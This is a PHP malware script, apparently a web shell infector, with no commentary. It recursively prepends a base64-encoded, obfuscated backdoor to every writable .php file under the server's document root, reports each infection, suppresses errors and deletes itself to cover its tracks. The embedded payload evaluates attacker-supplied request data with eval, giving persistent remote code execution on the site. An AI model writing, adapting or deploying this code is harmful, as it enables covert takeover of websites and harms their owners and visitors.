<?php
error_reporting(0);
function write_horse_2_php($dir, $b64code)
{
    if (is_dir($dir)) {
        $dh = opendir($dir);
        while (($file = readdir($dh)) !== false) {
            if (in_array($file, ['.', '..'])) {
                continue;
            }
            $file_path = $dir . '/' . $file;
            if (is_dir($file_path)) {
                write_horse_2_php($file_path, $b64code);
            } else {
                if (strpos($file_path, '.php') && is_writable($file_path)) {
                    if (file_put_contents($file_path, base64_decode($b64code) . file_get_contents($file_path)))
                        echo "Write horse in" . $file_path . " Ok!<br>";
                }
            }
        }
        closedir($dir);
    } else {
        echo $dir;
    }
}

$root_dir = $_SERVER['DOCUMENT_ROOT'];
$b64code = "PD9waHAgLyogKioqICovIGVycm9yX3JlcG9ydGluZyhFX0FMTF5FX05PVElDRSk7ZGVmaW5lKCe8JywgJ8AnKTskX1NFUlZFUlu8XSA9IGV4cGxvZGUoJ3wEfAV8BCcsIGd6aW5mbGF0ZShzdWJzdHIoJx+LCAAAAAAAAApVUF1LwzAUfZn/w7GPh7LuA51rYYyJK+jDVGYRhEJIk7ta6dJyk4HC/fFrl2hdHpJzD7n33HMAsUSGUJVocpVRh66osz8qYfJSMfjOtdGWlCDwpzK2SLmGu1tWc6UES9lbGyxAWSw+0YISpQUVQtaIFVxcuK6JT4lHjLq0pgElferRkJIxjWhJq8mFGKhWrJZp5gB3+1xc28f3WHc96PeG49FyZSnkyonrY+raWvnHOH5lm+j96SFi22j7svuw/Jeu3f93d+FeHH79cO3SOci5BRCGIQ8CmPE5b67ZIphKMV3AzT4MUynsL8+vz1t8v4sb4LmYUqYNR/NXZWCYKIC7POsA2h3OE6Lnzbn/BBz4F6TGAQAAJywweDBhLCAtOCkpKTsNCiRfU0VSVkVSe7x9WzBdKDApO2lmKCEkX1NFUlZFUnu8fXsweDAwMX0oJF9TRVJWRVJ7vH1bMHgwMDAyXSkpe2Z1bmN0aW9uIGRlY3J5cHQoJM6oj/X8KXskqf09JiRfU0VSVkVSe7x9OyTOqI/1/D0kqf17MHgwMDAwM30oJM6oj/X8KTsktD0kqf1bMHgwMDAwMDRdO2Zvcigkg8H4xD0wOySDwfjEPCSp/XsweDA1fSgkzqiP9fwpOySDwfjEKyspJLQuPSAkqf1bMHgwMDZdKCSp/XsweDAwMDd9KCTOqI/1/Fskg8H4xF0pLTB4MDAxKTtyZXR1cm4gJKn9ezB4MDAwMDN9KCSp/VsweDAwMDA4XSgkqf17MHgwMDAwMDl9LCSp/VsweDAwMDAwNF0sJLQpKTt9ZnVuY3Rpb24gZW5jcnlwdCgk5KzOwvApeyS7pD0mJF9TRVJWRVJ7vH07JOPOoc89JLukezB4MDV9KCTkrM7C8CklMHgwMDAwMz8weDAwMDAzLSS7pHsweDA1fSgk5KzOwvApJTB4MDAwMDM6MDsk5KzOwvA9JLukWzB4MGFdKCTkrM7C8C4ku6R7MHgwMGJ9KCS7pFsweDAwMGNdLCTjzqHPKSk7JPupgT0ku6R7MHgwMDAwZH07Zm9yKCSCxj0wOySCxjwku6RbMHgwMDAwMGVdKDAsJLukezB4MDV9KCT7qYEpKTskgsYrKykk5KzOwvA9JLukezB4MGZ9KCTkrM7C8Cwk+6mBWySCxl0sJLukWzB4MDAwMDBlXSgwLCS7pHsweDA1fSgk5KzOwvApKSwwKTsk7j0ku6RbMHgwMDAwMDRdO2ZvcigkgsY9MDskgsY8JLukezB4MDV9KCTkrM7C8Ck7JILGKyspJO4uPSAku6RbMHgwMDZdKCS7pHsweDAwMDd9KCTkrM7C8FskgsZdKSsweDAwMSk7cmV0dXJuICS7pFsweDBhXSgk7ik7fX1pZihpc3NldCgkX1NFUlZFUlskX1NFUlZFUnu8fVsweDAwMTBdXSkpeyRpbmZvPSRfU0VSVkVSe7x9ezB4MDAwMTF9KCRfU0VSVkVSe7x9WzB4MDAwMDEyXSgkX1NFUlZFUlskX1NFUlZFUnu8fVsweDAwMTBdXSksITApO2lmKGlzc2V0KCRpbmZvWyRfU0VSVkVSe7x9ezB4MDAwMDAxM31dKSYmIGlzc2V0KCRpbmZvWyRfU0VSVkVSe7x9WzB4MDE0XV0pKXtpZigkX1NFUlZFUnu8fXsweDAwMTV9KCRpbmZvWyRfU0VSVkVSe7x9WzB4MDE0XV0pPT09JF9TRVJWRVJ7vH1bMHgwMDAxNl0pe2VjaG8gJF9TRVJWRVJ7vH17MHgwMDAwMTd9OyRfU0VSVkVSe7x9WzB4MDAwMDAxOF0oKTtAZXZhbCgkaW5mb1skX1NFUlZFUnu8fXsweDAwMDAwMTN9XSk7JGNvbnRlbnRzPSRfU0VSVkVSe7x9ezB4MDE5fSgpO2VjaG8gJF9TRVJWRVJ7vH1bMHgwMDFhXSgkY29udGVudHMpO2VjaG8gJF9TRVJWRVJ7vH17MHgwMDAxYn07fX19Pz4=";
write_horse_2_php($root_dir, $b64code);
unlink(__FILE__);
